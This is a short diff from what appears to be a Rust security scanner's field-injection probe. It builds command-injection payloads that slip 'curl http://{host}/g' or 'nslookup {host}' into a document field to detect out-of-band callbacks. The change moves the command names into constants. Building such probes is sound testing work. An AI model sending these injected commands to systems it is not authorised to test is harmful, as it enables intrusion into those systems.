@@ -738,9 +738,9 @@ async fn probe_field_injection(
             } else {
                 ""
             };
-            let pl = format!("1{sep}curl http://{host}/g{close}");
+            let pl = format!("1{sep}{} http://{host}/g{close}", crate::inject::OOB_CURL);
             let _ = post(client, url, &build_doc(field, arg, &pl)).await;
-            let pl2 = format!("1{sep}nslookup {host}{close}");
+            let pl2 = format!("1{sep}{} {host}{close}", crate::inject::OOB_NSLOOKUP);
             let _ = post(client, url, &build_doc(field, arg, &pl2)).await;
         }
         if let Ok(mut v) = q.lock() {
